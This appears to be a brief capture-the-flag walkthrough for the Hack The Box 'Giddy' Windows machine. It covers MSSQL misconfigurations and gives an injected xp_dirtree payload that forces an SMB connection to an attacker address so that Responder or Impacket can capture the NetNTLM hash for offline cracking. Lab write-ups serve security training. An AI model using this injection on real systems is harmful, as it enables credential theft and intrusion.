This write-up documents the exploitation process of the Giddy machine on Hack The Box. The machine presents a Windows-based environment vulnerable to common misconfigurations in database permissions and binary abuse.

Key techniques explored include:
- Manual enumeration of SQL Server misconfigurations
- Abusing xp_cmdshell for remote code execution
- Identifying and exploiting weak file permission on service binaries for privilege escalation

OS: Windows
Difficulty: Medium

#### Capture and Crack NTLM hash

`xp_dirtree` is an undocumented MSSQL stored procedure that allows for interaction with local and remote filesystems. 

The MSSQL Server service account can be made to initiate a remote SMB connection using the command below.

```sh
'+EXEC+master.sys.xp_dirtree+'\\10.10.14.6\share--
```
![screenshot](/assets/images/giddy13.png)

By standing up Responder, Inveigh or Impacket's smbserver.py, is it possible to capture the NetNTLM hash. This hash can be subjected to an offline attack in order to recover the password.
